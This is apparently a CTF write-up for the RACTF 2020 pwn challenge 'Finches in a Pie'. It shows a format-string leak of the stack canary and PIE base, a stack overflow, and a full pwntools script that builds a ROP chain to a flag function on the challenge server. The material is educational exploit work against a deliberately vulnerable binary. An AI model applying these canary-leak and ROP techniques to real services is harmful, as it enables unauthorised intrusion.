---
title: "RACTF 2020: Finches in a Pie (Pwn)"
layout: post
date: 2020-06-11
tags:
- CTF
- writeup
- RACTF
- 2020
- Pwn
comments: true
---

> There's a service at xxx, exploit it to get the flag.
>
> Challenge instance ready at `88.198.219.20:27813`.
>
> [fiap](/files/fiap)

Let's start off by running checksec on the binary.

```
vagrant@ctf:/vagrant/challenges/ractf/Finches in a Pie$ checksec fiap
[*] '/vagrant/challenges/ractf/Finches in a Pie/fiap'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Okay, a X86 ELF file with a canary, NX, PIE and partial RELRO. Let's run it to get a better idea of what we're dealing with.


```
vagrant@ctf:/vagrant/challenges/ractf/Finches in a Pie$ ./fiap
Oh my!

You NAUGHTY CANARY

You ATE MY PIE!

CATCH HIM!

You got him! Thank you!
What's your name?
123
Thank you, 123!
Would you like some cake?
123

```

The program asks for our name, __repeats it back__ to us, and asks if we'd like some cake. Since our name is repeated back to us, there's a chance that there might be a format string vulnerability. So let's test for that.

```
vagrant@ctf:/vagrant/challenges/ractf/Finches in a Pie$ ./fiap
Oh my!

You NAUGHTY CANARY

You ATE MY PIE!

CATCH HIM!

You got him! Thank you!
What's your name?
%p
Thank you, 0xf7feada0!
Would you like some cake?
%p
```

Ah looks like we're right! Since we have a format string vulnerability that we can exploit, we've effectively gotten ourselves a read primitive and write primitive. So the canary and PIE should not pose and issue anymore, since there's a good chance that we can leak the canary value, and an address within the program. While we're at it, let's test if they're performing proper bounds checking for the size of our input.

```
vagrant@ctf:/vagrant/challenges/ractf/Finches in a Pie$ ./fiap
Oh my!

You NAUGHTY CANARY

You ATE MY PIE!

CATCH HIM!

You got him! Thank you!
What's your name?
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Thank you, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
Would you like some cake?
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
*** stack smashing detected ***: <unknown> terminated
Aborted (core dumped)
```

Omegalul. Looks likes the second input might be vulnerable to a buffer overflow. Okay we've actually got a lot to work with. Before we write our exploit, let's find the offsets of what we need to leak. So let's open up gdb.

```
───────────────────────────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0x565562ee <say_hi+108>    push   eax
   0x565562ef <say_hi+109>    call   printf@plt <0x56556030>

   0x565562f4 <say_hi+114>    add    esp, 0x10
   0x565562f7 <say_hi+117>    lea    eax, [ebp - 0x20]
───────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────────────
 ► f 0 565562ee say_hi+108
   f 1 565563d9 main+113
   f 2 f7df5e81 __libc_start_main+241
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> stack 15

00:0000│ esp  0xffffcd44 —▸ 0xf7feada0 ◂— pop    edx
01:0004│      0xffffcd48 —▸ 0xf7e4436b (puts+11) ◂— add    edi, 0x16dc95
02:0008│      0xffffcd4c —▸ 0x5655628f (say_hi+13) ◂— add    ebx, 0x2d71
03:000c│      0xffffcd50 —▸ 0xf7fb2000 ◂— 0x1d4d6c
04:0010│      0xffffcd54 ◂— 0x0
05:0014│      0xffffcd58 ◂— '%p.%p.'
06:0018│      0xffffcd5c ◂— 0x56002e70 /* 'p.' */
07:001c│      0xffffcd60 —▸ 0x56557036 ◂— 'You ATE MY PIE!\n'
08:0020│      0xffffcd64 —▸ 0xf7e9bf86 (setresgid+6) ◂— add    eax, 0x11607a
09:0024│      0xffffcd68 —▸ 0x56559000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x3ef4
0a:0028│      0xffffcd6c ◂— 0xa7b41c00
0b:002c│      0xffffcd70 —▸ 0x56559000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x3ef4
0c:0030│      0xffffcd74 ◂— 0x0
0d:0034│ ebp  0xffffcd78 —▸ 0xffffcd98 ◂— 0x0
0e:0038│      0xffffcd7c —▸ 0x565563d9 (main+113) ◂— mov    eax, 0

pwndbg> canary
AT_RANDOM = 0xffffcfeb # points to (not masked) global canary value
Canary    = 0xa7b41c00
Found valid canaries on the stacks:
00:0000│   0xffffcd6c ◂— 0xa7b41c00
```

Looks like we found the canary, and we've also got the address of `main+113` to work with. Nice!

```
vagrant@ctf:/vagrant/challenges/ractf/Finches in a Pie$ nm fiap | grep flag
00001209 T flag
```

Additionally, we also found a helper function that prints the flag for us. How convenient!

Ok so here's the game plan:

1. First input
  - Leak canary and address of `main+113`

2. Second input
  - Send payload: `<"A" * offset to canary><canary><"A" * additional offset to EIP><ret slide><flag>`

Now let's write a script to exploit this.

```python
#! /usr/bin/python3

from pwn import *

HOST = '88.198.219.20'
PORT = 52692
BINARY = './fiap'

elf = context.binary = ELF(BINARY)

elf.symbols['ret'] = elf.symbols['main'] + 127

CANARY_OFFSET = 25
PAYLOAD_OFFSET = CANARY_OFFSET + 16
FMT_PAYLOAD = '%11$p.%15$p'

splash()

r = remote(HOST, PORT)

with log.progress('Stage 1: Leak canary and (main + 113)'):
    r.recvuntil('What\'s your name?\n')
    r.sendline(FMT_PAYLOAD)
    r.recvuntil('Thank you, ')

    leaked = r.recvline().decode().strip()[:-1]
    canary, main_113 = [int(x, 16) for x in leaked.split('.')]

    log.success(f'Leaked canary: 0x{canary:08x}')
    log.success(f'Leaked (main + 113): 0x{main_113:08x}')

with log.progress('Stage 2: Generate ROP Chain'):
    elf.address = main_113 - (elf.symbols['main'] + 113)
    log.success(f'Calculated ELF base address: 0x{elf.address:08x}')

    rop = ROP(elf)
    rop.raw(p32(elf.symbols['ret']))
    rop.flag()

    log.success('Generated ROP Chain:')
    log.success(rop.dump())

with log.progress('Stage 3: Pwn'):
    r.recvuntil('Would you like some cake?\n')
    r.sendline(flat({ CANARY_OFFSET: p32(canary), PAYLOAD_OFFSET: rop.chain() }))

    log.success(f'Flag: {r.recvline().strip().decode()}')

r.close()
```

Let's see it in action!

<script id="asciicast-338088" src="https://asciinema.org/a/338088.js" async></script>

Flag: `ractf{B4k1ng_4_p1E!}`
